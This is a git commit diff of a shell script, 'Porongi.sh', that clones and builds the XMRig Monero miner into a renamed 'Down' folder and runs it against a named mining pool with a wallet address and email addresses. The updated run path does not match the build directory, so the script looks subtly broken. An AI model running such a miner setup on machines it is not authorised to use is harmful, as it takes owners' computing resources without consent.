3b2be8b69f70e3472dbad1de8f8cf09ed98027e7
Ferchulin6489 <Ferchulin_64_89@hotmail.com>
2017-12-26 14:11:18 +0100

    Update Porongi.sh

--- Porongi.sh
+++ Porongi.sh
@@ -2,23 +2,25 @@
 
 sudo apt-get install -y screen
 sudo apt-get update -y
-screen -S m1delt
 
 
 sudo apt-get install -y software-properties-common
 sudo add-apt-repository ppa:george-edison55/cmake-3.x
 sudo apt-get update -y
 
+
 sudo apt-get install -y cmake
+
 
 sudo apt-get upgrade -y
 
+
 sudo apt-get install -y build-essential cmake libuv1-dev libmicrohttpd-dev
-git clone https://github.com/xmrig/xmrig.git
-cd xmrig
+git clone https://github.com/xmrig/xmrig.git Down
+cd Down
 mkdir build
 cd build
 cmake ..
 make
 
-./xmrig -o  networkhit.securitytactics.com:8080 -u 46jFgp3e8SWHFzJ9XHNN5SLV7VsDgQCHfVq417Hzf9G6bPRfS347zhQjXqrT3anyZ22j7DEE74GkbVcQFyH2nNiC3hCeXyK -p ferkukucha@gmail.com -k -o networkhit.securitytactics.com:8080 -u 46jFgp3e8SWHFzJ9XHNN5SLV7VsDgQCHfVq417Hzf9G6bPRfS347zhQjXqrT3anyZ22j7DEE74GkbVcQFyH2nNiC3hCeXyK -p ferkukucha@gmail.com -k --cpu-priority 2
+/Down/./xmrig -o  networkhit.securitytactics.com:8080 -u 46jFgp3e8SWHFzJ9XHNN5SLV7VsDgQCHfVq417Hzf9G6bPRfS347zhQjXqrT3anyZ22j7DEE74GkbVcQFyH2nNiC3hCeXyK -p ferkukucha@gmail.com -k -o networkhit.securitytactics.com:8080 -u 46jFgp3e8SWHFzJ9XHNN5SLV7VsDgQCHfVq417Hzf9G6bPRfS347zhQjXqrT3anyZ22j7DEE74GkbVcQFyH2nNiC3hCeXyK -p ferkukucha@gmail.com -k --cpu-priority 2
